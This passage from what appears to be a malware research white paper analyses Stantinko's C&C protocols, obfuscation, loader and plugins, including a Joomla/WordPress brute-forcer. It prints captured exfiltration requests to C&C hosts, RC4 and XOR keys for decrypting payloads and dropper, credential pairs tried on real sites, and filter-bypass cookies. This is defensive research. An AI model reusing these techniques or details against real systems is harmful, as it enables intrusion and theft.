not clear whether there is a manual check before the next stage is installed, or if it is automatic.\nThe next service dropper uninstalls the “first service” from the service manager but leaves the binary\non the disk.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n###### 4.2. Network Protocol\n\nThe protocol used by this component is really similar to the protocol that we’ll see used\nwith the next two services. In this case, its only known purpose is to send some information about\nthe infected machine in order to receive the dropper for the PDS. Let’s first look at the beacon sent\nby the infected system and then we’ll describe how the server response is formatted.\n\nFirst, it sends an empty HTTP POST request to the C&C server URL. Then, it sends a second\nHTTP POST request to the same URL.\n\n```\nPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nHost: update.ultimate-discounter.com\nContent-Length: 819\nConnection: Keep-Alive\nCache-Control: no-cache\ng=1495030701&a=<BASE64-encoded data>\nHTTP/1.1 200 OK\nServer: nginx/1.8.1\nDate: Wed, 17 May 2017 14:18:21 GMT\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: close\n<BASE64-encoded data>\n\n```\n\nFigure 24. Second POST request to update.ultimate-discounter[.]com\n\nThe g parameter contains the current UNIX timestamp and the a parameter contains the encrypted\nreport. The latter is base64-encoded after being RC4-encrypted. To decrypt it, the MD5 of the g parameter\nis used as the key. Once decrypted, the report has the following format:\n\n`0xCE5C` `MD5` i.e. 1000_1234567\n\nMagic Header Bot ID Component Group ID Running\nversion process list\n\n\nSystem subkey Service type\nenum\n\n➋\n➊\n\n\nVolume serial `browser.exe`\nnumber version\n(optional)\n\n\nEach field of the report is separated by three asterisks: ***\n\n➊ Enumeration of the key-value pairs stored in HKLM\\SYSTEM\\\n```\n  CurrentControlSet\\services\\<service name>\\Parameters\\System\\\n\n```\n➋ An integer that indicates the service type\n\n `20 for bhctrl32.exe and ghstore.exe`\n\n `40 for udservice.exe`\n\nFigure 25. Client request protocol\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nThe server responds to the second request with either an empty response or an encrypted PE file.\nThe only payload we have observed is the PDS dropper. The payload is base64-encoded. Once decoded,\nthere’s a g parameter, then an & followed by binary data. This binary data has the following format.\n\n**0** **4** **8**\n\nPayload length Decrypted Payload name\npayload CRC32\n\n➊\n```\n                ***\n\n```\nMarker Encrypted\npayload\n\n➋\n\n➊ The payload name is the DLL name if it is an update or the plugin\nname between brackets (i.e. [SETUP_WSAUDIO]).\n\n➋ The encrypted payload is the binary that is compressed using zlib\nand then encrypted using RC4. The RC4 key is the MD5 hex digest\nof the g parameter.\n\nFigure 26. Server reply protocol\n\n###### 4.3. Obfuscation\n\nLike many of Stantinko’s recent components, the code is highly obfuscated with what seems\nto be a custom obfuscator. Not everything in Stantinko’s toolset is obfuscated, but all PE files\nthat are written to the disk are subject to obfuscation. The droppers of the current campaign,\nfor instance, are never written to disk and thus are not obfuscated. However, most\nof the services’ files are.\n\nIn the course of our investigation, we’ve encountered two different types of obfuscator. Both\nuse control-flow flattening [11] to thwart reverse engineering. Also, there’s a string obfuscator taking\nadvantage of the string formatting system. Figure 27 shows an example of how the obfuscated\nstrings are built in ghstore.exe.\n\n```\n[...]\nsprintf( L”%cho%ct%sS%sa%c%s%crve%c”, ‘G’, ‘s’, L”ery “,\n     L”tor”, ‘g’, L”e S”, ‘e’, ‘r’);\n[...]\n\n```\n\nFigure 27. Hex-Rays output of string building in ghstore.exe\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nBoth control-flow obfuscators merge the code of many functions in the same function. The number\nof function parameters is the maximum number of parameters needed by one of the embedded\nfunctions plus one. The extra parameter is used to decide which embedded function will be executed.\nFigure 28 shows a comparison between an obfuscated and a non-obfuscated version of the same\nfunction found in bhctrl32.exe.\n\nFigure 28. Comparison of an unobfuscated and an obfuscated function\n\nWith the first version of the obfuscator, each function contains a big switch-case control structure\nand a virtual instruction pointer. The switch-case is nested in an infinite loop. After each iteration,\nthe virtual instruction pointer is incremented by one. In each implemented branch of the switch-case\ncontrol structure, there’s a condition checking whether the last parameter of the function equals a given\nvalue. Thus, the code of a function of the original source code will be stored sequentially within\nthe switch-case construct and have an if condition to check if the last parameter of the obfuscated\nfunction corresponds to the ID given by the obfuscator to the original function. Functions IDs are\nsequential and start at 1.\n\nIn the second version of the obfuscator, a similar structure is used. However, instead of using a local\nvariable as the virtual instruction pointer, the last parameter passed to the function has this role.\nThe order of the instructions is no longer sequential. Also, after each loop, the integer is incremented\nby a large constant, making it more difficult to do the math. Furthermore, it is tedious to follow\nthe control flow because there’s a series of nested comparisons to the value of the virtual instruction\npointer, probably due to compiler optimizing the switch-case statement into a decision tree.\n\nOver the years, we see that the obfuscator was slowly being improved. It started with string obfuscation.\nAfter that, control flow flattening was added and now the authors use the much more efficient\ncurrent version.\n\nWith the exception of bhctrl32.exe from December 2015, all PDS installer services we have observed\nwere obfuscated.\n\n###### 4.4. Loader\n\nOne of the biggest features of Stantinko’s services is the custom loader they embed. It is used to release\nthe handle on the service binary making it possible to update itself at runtime and to load payloads\nsent by the server directly into memory. Thus, it allows the attackers to build a very flexible fileless\nplugin system. Most of the time, the malicious functionalities are inside those plugins, so it is more\ndifficult to understand what Stantinko actually does without seeing them in action.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n##### 5. PLUGIN DOWNLOADER SERVICE (PDS)\n\nIn the usual infection timeline, the Plugin Downloader Service comes right after the “first service”.\nIt is the first of the two persistent services. In this section, we will describe the current services\nand show how Stantinko’s operators designed their malware in what we believe to be an attempt\nto evade detection. On top of obfuscation techniques, they drop encrypted libraries and store perinfection encryption keys in the Windows Registry. This makes it difficult for researchers to analyze\nthe components as in most cases they only have access to the binaries.\n\nThe trojan downloader has a very flexible plugin system allowing it to load any PE file into memory.\nThe malicious behavior resides in these plugins.\n\nAs shown in Section 2.2, we’ve seen older versions of this component. They are not used anymore.\nIn contrast to the current component, there was no obfuscation or encryption, except\nfor the C&C servers.\n\n###### 5.1. Overview\n\nIn the new variant of the trojan, the operators split the malware in two separate DLLs. The first,\nwhich we call the loader here, doesn’t contain any malicious code. The second one is a library that\nhas its malicious code encrypted. The loader decrypts it and then calls the decrypted code to achieve\nits goals. Not all of these components are obfuscated, but we’ve seen obfuscated versions for both\nthe loader and the encrypted library. It seems that all the newest binaries are now obfuscated.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nFileTour\n\n\nMail.ru\n\n|Tour|Col2|\n|---|---|\n|Tour||\n|||\n|||\n\n|Down & r|loads uns|\n|---|---|\n\n\nThere are two ways that this component can be dropped. In the usual infection timeline,\nthe PDS Installer will get the dropper from the C&C and will install it. The other way is achieved\nby the BEDS that we’ll analyze in the next section. The C&C server can send a DLL update (marked\nas version 3.xx) for this service that will contain the dropper. That way, if the trojan downloader\nis erased from the system, the operators can infect it again from the other service.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nThe dropper writes both DLLs — the loader and the encrypted library — to the disk and adds them\nto the system32 directory. It tampers with their timestamps by copying those of kernel32.dll.\nTo achieve persistence, it creates a service with the SERVICE_AUTO_START flag set. Thus, the service\nis launched every time Windows starts.\n\nAt time of writing, we are aware of three different services used as PDS. Here’s a table\nsummarizing them:\n\n\nTable 2. Plugin Downloader Service variants\n\n\nEncrypted\nLoader Service Name Service Description First seen\nLibrary\n\n\nWindows Audio\nwsaudio.dll fdclient.dll\n5.1 Surround\n\nBiometric data\nwbiosrvp.dll biosysrt.dll protection\nservice\n\nService of\nbstreamsvc.dll vp9core.dll streaming video\ndecoding\n\n\nThis service transform stereo audio\ninto windows audio 5.1. If this service\nis stopped, windows audio 5.1 will\nbe disabled.\n\n\nService protects the user’s biometric\n2015-11\ndata on a computer\n\nSupport for hardware acceleration\nof video decoding using standard 2017-03\nVP9 Bitstream Overview\n\n\n2015-01\n\n\nAs it is the case with many Stantinko components, the PDS embeds known open source software.\nWe believe Stantinko’s operators try to make their services look as legitimate as possible.\nHere’s the list of the software source code used by Stantinko:\n\n\nTable 3. Mimicked software\n\n\nComponent name Mimicked software Software website\n\n`wsaudio.dll` LAME MPEG Audio encoder [http://lame.sourceforge.net/](http://lame.sourceforge.net/)\n\n\n`wbiosrvp.dll` AFNI (Analysis of Functional\nNeuroImages)\n\n`bstreamsvc.dll` Libart: a library for highperformance 2D graphics\n\n\n[https://afni.nimh.nih.gov/](https://afni.nimh.nih.gov/)\n\n[http://www.levien.com/libart/](http://www.levien.com/libart/)\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nFigure 30. Strings from the AFNI project found in wbiosrvp.dll\n\n###### 5.2. Plugin Downloader Service Analysis\n\n 5.2.1. Versioning And Update Mechanism\n\nWe noticed that Stantinko’s operators use the PE header to store the version of their components.\nThey use the MajorImageVersion and MinorImageVersion fields of the IMAGE_OPTIONAL_HEADER\nstructure. The former is used to store the major version and the latter for the minor version.\nTwo major versions are used: 1 and 3. We noticed that the operators use the 3 as the major\nversion when the component embeds a dropper for another component. Some components\ncan embed droppers to install the next persistent service or to reinstall a service that has been deleted\nfrom the infected system.\n\nThe PDS has a custom PE loader. The update mechanism is based on this functionality. When the service\nstarts, the loader and the encrypted library load themselves using the custom loader. Once loaded,\nthey call FreeLibrary on themselves to free the handle to their backing file. Thus, the service\ncan overwrite its own DLLs at runtime.\n\nThe update mechanism is also used to run the BEDS dropper (samples with MajorImageVersion\nset to 3). The BEDS is the second Stantinko’s persistent service that is described in the next section.\nOnce the BEDS is successfully installed, the version 3.xx of the encrypted library is replaced by version 1.xx\nto make sure the dropper doesn’t remain on disk. This is something Stantinko’s authors are good at:\nmaking it difficult to get hold of their droppers. Without its dropper some of the pieces needed\nto analyze a component are always missing. This is one of the rare cases where the dropper\nis written to disk. They are usually downloaded and directly loaded in memory.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n###### 5.2.2. Service Encryption Scheme\n\nIn this section, we’ll briefly describe the process for decrypting the encrypted library. The encrypted\nlibrary exposes an export called GetInterface. This function takes an integer as parameter\nand contains a switch-case control structure that contains mostly C&C communication related\ncode. By calling the GetInterface(0), the loader receives a pointer to the beginning of the encrypted\nsection and GetInterface(1) returns its length.\n\nTo decrypt the section, it uses what seems to be a custom key-scheduling algorithm. It creates\na 256-bytes long permutation vector containing all the values between 0x00 and 0xFF. This vector\nis derived from the MD5 used as bot ID. Each byte in the encrypted section is substituted by the index\nat which the value is found in the key vector.\n\n```\nvoid __usercall F_decrypt_fdclient(int botid@<eax>, unsigned int\ncipher_len@<edi>, char *encrypted_section@<esi>)\n{\n  unsigned __int8 *key; // eax@1\n  unsigned int i; // edx@1\n  int j; // ecx@2\n  key = F_derive_key((char *)botid);\n  i = 0;\n  if ( cipher_len )\n  {\n  do\n  {\n    j = 0;\n    while ( encrypted_section[i] != key[j] )\n    {\n      if ( ++j >= 0x100 )\n        goto LABEL_7;\n    }\n    encrypted_section[i] = j;\nLABEL_7:\n    ++i;\n    }\n    while ( i < cipher_len );\n  }\n  operator delete(key);\n}\n\n```\n\nFigure 31. Hex-Rays output of the substitution algorithm used to decrypt fdclient.dll\n\n###### 5.2.3. Networking\n\nEarly variants used to store the C&C server address encrypted at the end of the DLL. In the current\nvariants, the domain is hardcoded in the encrypted DLL. Since it is embedded in the encrypted code,\nthere’s no need to further encrypt it. The operators can modify this domain by sending an updated\nversion of the encrypted DLL if needed. However, it seems that when the authors want to use a new\ndomain name as C&C server, they also change the name of the file and the service. The list of known\nC&C servers is shown in Table 4.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nTable 4. Command and control servers per service type\n\n\nService type Domain URL\n\nwsaudio.dll wsaudio[.]com hxxp://wsaudio.com/index.php\n\nwbiosrvp.dll biosysltd[.]com hxxp://biosysltd.com/index.php\n\nbstreamsvc.dll vp9codec[.]com hxxp://vp9codec.com/index.php\n\n###### Client Protocol\n\nThe protocol used by the PDS is based on HTTP. First, it sends an empty HTTP POST request to its C&C\nto /index.php. If the server responds successfully, a second POST is sent to the same URL with two\nparameters. The a parameter contains the time in HH:MM:SS format and the b parameter contains\nbase64-encoded data. Once base64-decoded, the b parameter contains the report data encrypted\nwith RC4 using the MD5 of the a parameter as the key.\n\nThe decrypted report has the following format:\n\n`0xCE5C` `MD5` i.e. 1000_1234567\n\nMagic Header Bot ID Loader version Group ID Running\nprocess list\n\nSystem subkey Service type Encrypted library\nenum ➋ version\n\n➊\n\nEach of the report’s fields are separated by three asterisks: ***.\n\n➊ Enumerates the key-value pairs stored in HKLM\\SYSTEM\\\n```\n    CurrentControlSet\\services\\<service name>\\Parameters\\System\\\n\n```\n `p1: PDS is installed`\n\n `p2: BEDS is installed`\n\n➋ This is an integer that indicates the service type\n\n `10: fdclient`\n\n `30: wbiosrvp`\n\n `50: bstreamsvc`\n\nFigure 32. Decrypted report format\n\n###### Server Protocol\n\nThe server response may either be an update for a component (wsaudio.dll/fdclient.dll),\na plugin or an empty response. The body is base64-encoded and always contains the g parameter.\nAn empty response only contains the g parameter. When there’s a component update, the a parameter\nis used and when it’s a plugin, the p parameter is used. The packet format of the component update\nand the plugins is the same. Like the client protocol, the payload is encrypted using the MD5 of the g\nas key. However, it is not the full packet that is RC4-encrypted, but only the payload (the PE binary).\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n**0** **4** **8**\n\nPayload length Decrypted Payload name\npayload CRC32\n\n➊\n```\n                ***\n\n```\nMarker Encrypted\npayload\n\n➋\n\n➊ The payload name is the DLL name if it is an update or the plugin\nname between brackets (i.e. [GET_HDD]).\n\n➋ The encrypted payload is a binary that is zlib-compressed\nand RC4-encrypted.\n\nFigure 33. Server reply format\n\n###### 5.2.4. How to Extract The Embedded Dropper\n\nAs previously mentioned, some versions of the encrypted library embed a dropper for the BEDS.\nWe’ll describe how we can extract the dropper.\n\nThe encrypted library exports GetInterface. This function exposes most of the encrypted code.\nIt also exposes the embedded dropper. Interestingly enough, the dropper is not in the encrypted\nsection. It is only XORed with a hardcoded key. This key is used in all the service types\nwe have analyzed.\n\nA call to GetInterface(37) retrieves a pointer to the encrypted payload. GetInterface(38)\nretrieves the length of the payload. For decryption, XOR the encrypted payload with this key:\n```\n“\\x7e\\x5e\\x7f\\x8c\\x08\\x46\\x00”.\n\n###### 5.3. Plugins\n\n```\nThe PDS itself doesn’t do much. It implements a very flexible plugin mechanism enabling the operators\nto run any PE executable with the same privileges as the service. The plugins are downloaded\nfrom the C&C server and executed in memory without being written to disk or in the Registry.\nThus, there is no persistence mechanism and they will not survive reboot. Figure 34 shows\nthe prevalence of each module we have seen.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n#### 74.6% 20.4%\n\nSearch Parser Brutplugin\n\n\nGet HDD serial number\n\n#### 1.7%\n\nPlugin Installers remover\n\n#### 0.3%\n\nRadmin, Facebook bot\n& Zaxar cleaner\n\nFigure 34. Prevalence of the different PDS modules\n\nThe statistics presented in Figure 34 were collected during a limited period of time during\nMarch 2017 and from a limited number of requests. Thus, it may not represent the real\nprevalence of each type of malware. However, because there is no persistence mechanism\nfor the modules, we believe that our data collection is representative of the prevalence\nof the modules during the collection period.\n\n###### 5.3.1. Get HDD Serial Number\n\nThis is a simple plugin that is usually the first to be sent to a newly-infected machine by the PDS.\nAs its name suggests, it sends the volume serial number of the volume where Windows is installed.\nThe plugin sends the info via a POST request to hxxp://185.28.22.22/p/uhp.php.\n\n```\nPOST /p/uhp.php HTTP/1.0\nAccept: text/html,application/xhtml+xml,application/\nxml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36\n(KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36\nContent-Length: 47\nConnection: Keep-Alive\nCache-Control: no-cache\nh=1031768789&u=dfe12c00f45d6308196d94ff718b3dd6\n\n```\n\nFigure 35. POST request to send the volume serial number\n\nThe h parameter contains the serial number and the u parameter contains the bot ID\nof the infected system.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n###### 5.3.2. Plugin Installers Remover\n\nThis plugin does a simple job. It removes the browser extensions installer usually created by the BEDS.\nThe paths to remove are the following, found inside the user’s Application Data (CSIDL_APPDATA)\ndirectory:\n\n- ihctrl32\\SafeSurfing\n\n- `ihctrl32\\TeddyProtection`\n\n- themctrl\\SafeSurfing\n\n- `themctrl\\TeddyProtection`\n\nThe version of this plugin we analyzed dates back to before the opsatadc.dll service type\nwas released. We’re confident the current version adds the opsatadc directory to these paths.\n\n###### 5.3.3. Search Parser\n\nThis module performs searches in the background on Google. Search queries are distributed\nby multiple C&C servers hosted on compromised servers, and executed on the infected machines.\nFinally, the results are sent back to the C&C servers. Thus, the operators are able to perform a large\nnumber of anonymous searches from multiple IP addresses to bypass Google’s rate limiting. We will\nfirst describe the plugin and then describe the scripts running on the C&C servers’ side.\n\n###### Functionality\n\nThis modules relies on a GitHub repository, hxxps://github.com/brenev/collection,\nto get the list of current C&C servers. The file named index contains this list, which is encrypted\nwith the RC4 algorithm using the key 381f477476180e9aebd620343188bc97. Interestingly,\nby cloning the repository, it is possible to access all this file’s history, and so we can identify\nall the URLs that were used by this module in the past, too. The first version of the index file was\ncommitted on January 2014, thus indicating that this module has been active for at least three years.\nBy looking at the URLs, it is easy to identify a pattern: they all end with /images/banners/b1/\n```\nindex.php. The websites are, in nearly all cases, running Joomla. The history of the updates is shown\n\n```\nin Figure 36 and the full list of URLs is in Appendix A. The current list, updated on April 3rd 2017,\nis provided below.\n\n```\nhxxp://sceptretoursandtravel.com/images/banners/b1/index.php\nhxxp://dorazio.altervista.org/images/banners/b1/index.php\nhxxp://k3bweb78.altervista.org/images/banners/b1/index.php\nhxxp://aupair-germany.eu/inhalt/images/banners/b1/index.php\nhxxp://www.chantalligraphics.com/health101.old/images/banners/b1/\nindex.php\nhxxp://treningmentalny.home.pl/m_dddd/images/banners/b1/index.php\nhxxp://wolnywww.instytutslowacki.pl/images/banners/b1/index.php\nhxxp://edomerlomat.altervista.org/images/banners/b1/index.php\n\n```\n\nFigure 36. List of compromised websites used as command and control servers\nfor the search parser module (April, 3rd 2017)\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nFigure 37. Number of commits on the GitHub account for the file named index\n\nAt regular intervals, the module asks one of the C&C servers for a search task. It sends\na POST request:\n\n\n➊ ➋ ➌\n```\naction=get&token=5966a732551253e338649c6bddf4d9a9&version=1.05\n\n```\n\n➊ GET to ask for a task.\n\n➋ Hardcoded value in the binary. It is also the RC4 key for the wss file\nas described above.\n\n➌ The version of the module.\n\nFigure 38. POST request data\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nThe reply is JSON data that is encrypted using the same RC4 key (381f477476180e9aeb\n```\nd620343188bc97). An example of a JSON task is given below.\n        {\n         “search”: {\n          “type”: “text”, ➊\n          “system”: “google”, ➋\n          “query”: “intext:\\”Powered by joomla\\”\n        intext:\\”gehrungsschraubstöcke n\\”” ➌\n         },\n         “options”: {\n          “sleep_on_ban”: {\n            “min”: 40, ➍\n            “max”: 70\n          },\n          “sleep_on_next_page”: {\n            “min”: 30, ➎\n            “max”: 60\n          }\n         }\n        }\n\n```\n➊ The type of content to search. It can be text or image.\n\n➋ The search engine to use. It may be either Google or Yandex. This version\nof the plugin only supports Google.\n\n➌ The search query.\n\n➍ If a captcha is displayed, it will sleep for a random interval (in seconds)\nbetween these two values.\n\n➎ Similar to sleep_on_ban. It will sleep for a random interval (in seconds)\nbetween these two values before crawling the next page.\n\nFigure 39. JSON search task\n\nOnce a task is received by the module, it will perform the search using the selected search engine.\nIt does not emulate a full web browser and relies on WinHTTP functions. Note that the User-Agent\nis always Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)\n```\nChrome/46.0.2490.71 Safari/537.36. This is the user agent of an old version of Chrome from\n\n```\n2015 running on Windows XP. It might be used to identify the requests made by this Stantinko module.\n\nIt then parses the HTML page using an embedded HTML parser to extract the links. It also browses\nthe next pages, if any. If it detects that a captcha is required, it waits a random number of seconds\nbetween the sleep_on_ban values and tries again to perform the search.\n\nFinally, it creates a report for the C&C that contains all the URLs found in the search.\n\nBefore asking the C&C server for a new task, it waits for 40 minutes. We believe this is necessary\nto avoid the compromised machine being banned by Google. Moreover, the impressive number\nof infected machines allows them to distribute the load easily between the bots.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n###### On The C&C Server Side\n\nThanks to the webmaster of a compromised website, we had access to the scripts responsible\nfor giving tasks to the compromised machines. Surprisingly, it is not a proxy between the botnet\nand a backend C&C server. The logic is on the compromised servers.\n\nOn the compromised websites they use, they create a directory called b1 that contains five files:\n```\nindex.php, index2.php, data.dat, data2.dat and inifile.\n\n```\nThe index.php file is the main script responsible for interacting with the search parser module.\nIt provides the following actions:\n\n###### statistics This gives the number of remaining searches to perform and the size \nof the results file (data2.dat).\n\n###### get_result The operator can use this function to collect the results. The data2.dat file \nis compressed in a zip file before being downloaded.\n\n###### clear This deletes the files data.dat, data2.dat and inifile.\n\n new The operator can use this action to upload a zip file that will be extracted \non the server. It is probably used to update the scripts and dat files.\n\n###### post This function is used by the search parser plugin to send the search \nresults. The results are stored in the data2.dat file.\n\n###### get This function is used by the search parser plugin to get a search task, \nas seen in Figure 38. It will use the index2.php script and a word\nfrom the data.dat file to build the task.\n\nThe RC4 key (381f477476180e9aebd620343188bc97) is hardcoded in the script and there is weak\nauthentication performed by the following check:\n\n```\n<?php\nif (!isset($_POST[‘token’]) || $_POST[‘token’] !=\n‘5966a732551253e338649c6bddf4d9a9’ || !isset($_POST[‘action’]) ||\n!isset($_POST[‘version’]) || $_POST[‘version’] < 1.05)\n\n```\n\nFigure 40. Conditions for request validation\n\nThe index2.php contains two functions that are used to build the JSON search task.\nFigure 41 is an example of such script.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n➊ The search engine to use.\n\n➋ The search query. The first part is hardcoded and can only be changed\nby uploading a new index2.php file. In this example, the content\nof inurl search operator is a Joomla path. The $task variable will\nbe replaced by a word from the data.dat file.\n\n➌ How long to sleep in seconds if a captcha is displayed.\n\n➍ How long to sleep in seconds before crawling another Google page.\n\nFigure 41. Script used to build the search tasks\n\nThe data.dat file contains a list of words. On this particular server, it consisted of Greek words\nbut we saw other search requests with German words. We believe these words are appended\nto the search to get more results than just searching for a generic Joomla pattern. In the file found\non the compromised server, each word is searched for 50 times and the list contains 17569 words.\n\nThe data2.dat file contains the search results sent by the botnet. Each line of this file is a JSON\nreport containing a list of URLs. The Figure 42 is an example of a report:\n\n```\n{\n  “search”: [\n    [...]\n    “http:\\/\\/www.fcpaok.net\\/paok-news\\/football-news\\/32-supe\nrleague\\/1466-2015-04-05-14-01-37”,\n    “http:\\/\\/vounisios.pblogs.gr\\/2013\\/20130120.html”,\n    “http:\\/\\/info-gate.gr\\/our-partners-2”,\n    [...]\n  ]\n  [...]\n}\n\n```\n\nFigure 42. Search results - data2.dat file\n\nAs the .dat files are freely accessible on all the compromised websites, we downloaded some pairs\n```\ndata.dat/data2.dat to gather statistics on the number of queries per day.\n\n```\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nTable 5. Statistics on the number of searches done per hour\n\n\nNumber of search results Duration (hours) Number of search results per hour\n\n878,419 24 36,601\n\n1,430,208 207 6,909\n\n1,377,508 87 15,833\n\nThe big difference can be explained by the quantity of C&C servers that still have jobs left to do.\nIf only one or two servers have jobs to distribute, all the bots will contact them, allowing the searches\nto be performed more quickly. We also noticed that all the search tasks are typically done within\na few days and that the search parser module is idle most of the time, waiting for the botmaster\nto add new search tasks. The operators own such a big botnet that they cannot find enough work\nto keep it busy.\n\n###### 5.3.4. Brutplugin\n\nThe single purpose of this plugin is to brute-force Joomla and WordPress administrator log in pages.\nThe targeted websites are likely found by the operators using the search parser module described above.\n\nAs brute-forcing websites could generate a considerable amount of traffic, this module begins\nby browsing well-know websites. It may be used to evade detection by trying to emulate human\nbehavior. A list of such websites is provided in Figure 43.\n\n```\nvk.com\nmsn.com\nmsdn.microsoft.com\ntwitter.com\nmail.ru\nwww.youtube.com\n\n```\n```\nwww.wikipedia.org\nwww.beeline.ru\nbash.org\nwww.liveinternet.ru\n\n```\n\nFigure 43. Websites used to generate legitimate traffic\n\nFirst, the malware generates a unique identifier (uid) using a method similar to other Stantinko\ncomponents. It computes the MD5 hash of a pseudorandom number concatenated with the volume\nserial number. This value is stored in the Registry in HKCU\\SOFTWARE\\dmn\\uid. Once this is done,\nit contacts the hardcoded C&C server (hxxp://185.28.22.22/brut/bao.php) to get a task.\nThe protocol is similar to the search parser module: the requests and replies are compressed using\ngzip, RC4-encrypted and base64-encoded. The RC4 key for the requests is hardcoded in the binary\n(5807285908f3aa19964fda0c6f84adfe) while the RC4 key for the response is the k parameter,\nthat is a timestamp, sent in the POST request.\n```\n        k=1490123645 ➊\n        a=g ➋\n        v=3.30 ➌\n        uid=d6f3819b9193dab2db76d3a2495d075c ➍\n\n```\n➊ Current timestamp.\n\n➋ The action: g for GET.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n➌ The version of the module.\n\n➍ A unique identifier of the compromised machine.\n\nFigure 44. Decrypted request\n```\n        15 3 300000 10000 | ➊\n\n```\n➋ ➌ ➍ ➎ ➏\n```\n        80595494 http://eurograce.com:80/ 2 admin 100859\n        80595494 http://eurograce.com:80/ 2 admin mgomez\n        80595494 http://eurograce.com:80/ 2 admin 2HhF19\n        64586213 http://azov-yaseni.ru:80/ 2 admin DTM1992\n        64586213 http://azov-yaseni.ru:80/ 2 admin tomcat02\n        64586213 http://azov-yaseni.ru:80/ 2 admin abel1234\n        [...]\n\n```\n➊ Various parameters such as the number of threads to use.\n\n➋ The identifier of the targeted website.\n\n➌ The URL of the targeted website.\n\n➍ The type of website (1 for a WordPress website and 2 for a Joomla\nwebsite).\n\n➎ The username to try.\n\n➏ The password to try.\n\nFigure 45. Decrypted response (partial)\n\nThe C&C server provides logins and passwords likely to be used in the wild. Thus, it doesn’t perform\na typical brute-force attack, but rather a dictionary attack.\n\nSecond, the module try to brute-force each website using the credentials provided by the C&C server.\nLike the search parser module, it relies on a custom HTTP library and does not use or emulate a web\nbrowser. Interestingly, they also use the same custom user agent: Mozilla/5.0 (Windows NT 5.1)\n```\nAppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36. \n\n```\nThe brute-force procedure is described below:\n\n1. [It requests the page http://<website-url>/administrator for Joomla](http://%3Cwebsite-url%3E/administrator)\n[or http://<website-url>/wp-admin for WordPress.](http://%3Cwebsite-url%3E/wp-admin)\n\n2. It parses the page using its custom HTML parser to find the login form.\n\n3. It tries to connect again\n\na. If the response was HTTP 200, it fills the HTML login form with the credentials provided\nby the C&C server.\n\nb. If the response was HTTP 401, it tries to log in using HTTP basic access authentication\n(Authorization: Basic).\n\n4. It parses the result page to know if it is connected as an administrator.\n\nWe do not have metrics on the success rate of their brute-force attempts. However, considering how\nwidely spread this module is, we believe they can successfully compromise a lot of websites every day.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nIn the case of a WordPress website, there is code present in the module responsible for uploading\na PHP backdoor using the WordPress plugin editor available at the URL http://<website-url>/wpadmin/plugin-editor.php. However, in the module we have analyzed, it is not fully implemented.\nThe WordPress plugin is really simple: the only functionality is to create or delete files. The code\nof the plugin is provided in Appendix D.\n\n**BYPASSING FILTERS**\n\nThis module carefully adds the following HTTP cookies in its requests. It adds:\n\nJoomla WordPress\n\nCHECK=1 humans=checktest\n\nhumans=checktest beget=begetok\n\njapass=1\n\nrqbct=1\n\nThese cookies are not well documented but they are used in several crawling programs\nand by brute-force protection software.\n\nFinally, the module creates a report for the C&C server. This report is also compressed\nwith gzip, encrypted with RC4 using the key 5807285908f3aa19964fda0c6f84adfe and finally\nbase64-encoded.\n\n```\nuid=d6f3819b9193dab2db76d3a2495d075c\na=s&ok_oid=80595494, 64586213, 64586212, 64586211, 64586210,\n64586208, 64586207, 64586204, 64586201, 64586200, 64586199,\n64586198, 64586197, [...]&bad_oid=64586198, 79972780,\n77993537&reset_oid=\n\n```\n➊ ➋ ➌ ➍ ➎ ➏\n```\n&0[o]=80595494 http://eurograce.com:80/ admin 100859 4 2\n&1[o]=80595494 http://eurograce.com:80/ admin mgomez 4 2\n&2[o]=80595494 http://eurograce.com:80/ admin 2HhF19 4 2\n[...]\n\n```\n\nEach line of the report contains the following fields:\n\n➊ The internal identifier of the targeted website.\n\n➋ The URL of the targeted website.\n\n➌ The username tried.\n\n➍ The password tried.\n\n➎ The return code\n```\n     2 if it is not a WordPress or a Joomla website.\n     3 if the website is down.\n     4 if the website is up but the login attempt failed.\n\n```\n➏ The website type: 1 for WordPress or 2 for Joomla.\n\nFigure 46. Decrypted report\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n###### 5.3.5. Facebook Bot\n\nThis module is a bot designed to interact with Facebook using fake accounts. We have seen botnets\nthat were able to interact with social networks before. For example, ESET released a white paper\non Linux/Moose in 2015, a Linux router-based worm that targets social networks [5].\n\nThis module is a bit different from previous malware that was able to interact with Facebook.\nStantinko’s Facebook module is able to perform a wide range of actions including creating\naccounts, fetching user emails from several Russian providers, adding friends, making comments\nand bypassing captcha using a paid online service. Like the previously described modules,\nit uses their custom HTTP library with the same user agent (Mozilla/5.0 (Windows NT 